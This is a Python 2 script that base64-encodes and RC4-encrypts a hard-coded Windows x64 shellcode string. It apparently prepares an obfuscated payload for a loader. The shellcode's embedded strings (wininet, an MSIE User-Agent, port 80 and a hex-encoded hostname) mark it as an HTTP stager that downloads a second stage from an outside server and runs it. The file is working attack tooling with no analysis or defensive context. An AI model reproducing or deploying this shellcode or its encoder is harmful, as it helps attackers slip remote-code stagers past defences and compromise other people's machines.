import hashlib, base64, sys, os

def rc4(text, key):
    # Use md5(key) to get 32-bit key instead raw key
    key = hashlib.md5(key).hexdigest()
    result = ''
    key_len = len(key)
    #1. init S-box
    box = list(range(256))#put 0-255 into S-box
    j = 0
    for i in range(256):#shuffle elements in S-box according to key
        j = (j + box[i] + ord(key[i%key_len]))%256
        box[i],box[j] = box[j],box[i]#swap elements
    i = j = 0
    for element in text:
        i = (i+1)%256
        j = (j+box[i])%256
        box[i],box[j] = box[j],box[i]
        k = chr(ord(element) ^ box[(box[i]+box[j])%256])
        result += k
    result = base64.b64encode(result)
    print (result)


shellcode = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x76\x4a\x55\x48\x00\xb1\xb3\xeb\x68\x55\xb9\x3f\x65\x11\xc9\xc4\x48\x0d\x21\x7c\x2e\x6a\x42\x9f\x98\x95\x5e\x3d\x0f\xba\x35\x2d\x89\xcd\x2d\xac\x10\xbb\x36\x12\x01\xd0\x91\xe5\x5a\x87\x53\x09\x32\x8c\x32\x16\x2f\xfe\x0d\x1c\x8b\x6b\x23\x0d\xfd\x59\x3b\x3f\x5a\xda\xf5\x37\xe4\xed\x13\x8b\x2a\xf9\x2b\x98\xfa\xa4\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x29\x0d\x0a\x00\x29\xcd\xbe\x7b\x72\xcf\x28\x1d\xf9\x4f\x55\x62\x92\xf3\x5b\x92\xd8\x3b\x37\x9a\xe4\x6d\xa0\x93\x6f\x97\xe2\xaa\xd7\xe4\xd4\xa4\x32\x1b\x9d\x89\xe9\xb2\xca\xaa\x16\x48\x72\x12\x29\x35\x7c\x98\x4b\xc3\x46\xf9\x95\x5c\xb7\xe5\xcb\xb9\x66\x93\xe5\x79\x56\xda\x62\x51\x6b\x49\xed\x6b\xeb\xc9\x7a\x67\xb6\x2c\x24\x67\x63\xfc\x3f\xb8\xdc\xa0\x09\xb1\x4e\x11\x1b\x78\x7e\x12\x5b\x6c\x3f\xd3\x6e\xbe\x3c\x71\x87\x70\xee\x30\x15\xc4\xb6\x03\x8d\x5f\xd0\x88\x20\x7c\x7f\x09\x4b\x1b\x96\xe2\xc4\x9a\x34\x05\x7b\xda\x5e\xa8\x3f\x60\x9a\x4e\xb9\xdb\x30\xd2\xe6\xbf\xa1\xb2\x20\xfd\xd1\x27\xce\xa7\xda\x93\xa3\x24\x28\x64\xd4\x1f\x41\x93\x45\xde\xae\x80\xce\x62\x8a\x4a\xe6\x9d\x21\xe0\xae\x72\xed\x58\xac\x25\x4f\x44\x0f\xc0\x31\x63\xa2\x16\x49\x5c\x96\x98\xe2\x51\x5b\xed\xa8\xf4\xe4\x92\xbc\xbc\x4f\xfd\x03\xcd\x49\x0c\x0f\xa1\xd0\x91\xf0\x3d\xec\x65\xa6\x3e\xdb\xc0\xe4\x70\x8c\x14\xb9\xd0\xe7\xc4\x9a\x2e\x86\x61\x33\x50\x59\xd5\xf5\xac\x03\x4a\xe4\xf9\x64\xe6\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x66\x34\x63\x6b\x65\x64\x2d\x73\x74\x75\x70\x31\x64\x2e\x63\x65\x6e\x73\x79\x73\x2e\x69\x6f\x00\x12\x34\x56\x78"
key = "\x66\x34\x63\x6b\x65\x64\x2d\x73\x74\x75\x70\x31\x64\x2e\x63\x65\x6e\x73\x79\x73\x2e\x69\x6f\x00\x12"
#base64encode
baseStr = base64.b64encode(shellcode)
#RC4 + base64encode
payload = rc4(baseStr, key)